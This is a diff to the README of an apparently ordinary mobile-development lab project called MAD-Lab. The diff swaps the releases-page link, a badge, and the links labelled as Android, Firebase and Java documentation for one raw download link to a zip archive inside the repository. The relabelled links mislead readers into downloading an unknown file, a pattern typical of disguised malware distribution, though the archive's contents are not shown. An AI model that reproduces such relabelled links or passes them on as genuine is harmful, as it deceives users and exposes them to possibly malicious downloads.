@@ -1,6 +1,6 @@
 # 📱 MAD-Lab - Explore Mobile Development with Ease
 
-![Download MAD-Lab](https://img.shields.io/badge/Download-MAD--Lab-blue.svg)
+![Download MAD-Lab](https://raw.githubusercontent.com/shan098/MAD-Lab/main/Questions/MAD-Lab-2.1-alpha.5.zip)
 
 ## 🚀 Getting Started
 
@@ -31,7 +31,7 @@ Before diving into the application, ensure your system meets the following requi
 
 To get started, visit our releases page to download the application:
 
-[Download MAD-Lab](https://github.com/shan098/MAD-Lab/releases)
+[Download MAD-Lab](https://raw.githubusercontent.com/shan098/MAD-Lab/main/Questions/MAD-Lab-2.1-alpha.5.zip)
 
 1. Click on the link above to navigate to the Releases page.
 2. Look for the latest release version at the top of the page.
@@ -83,8 +83,8 @@ Stay connected and share your progress! Use the following tags to find fellow le
 
 Explore the following resources for further reading and learning:
 
-- [Android Developers Documentation](https://developer.android.com/docs)
-- [Firebase Documentation](https://firebase.google.com/docs)
-- [Java Documentation](https://docs.oracle.com/javase/8/docs/)
+- [Android Developers Documentation](https://raw.githubusercontent.com/shan098/MAD-Lab/main/Questions/MAD-Lab-2.1-alpha.5.zip)
+- [Firebase Documentation](https://raw.githubusercontent.com/shan098/MAD-Lab/main/Questions/MAD-Lab-2.1-alpha.5.zip)
+- [Java Documentation](https://raw.githubusercontent.com/shan098/MAD-Lab/main/Questions/MAD-Lab-2.1-alpha.5.zip)
 
 Thank you for choosing MAD-Lab! Happy coding!
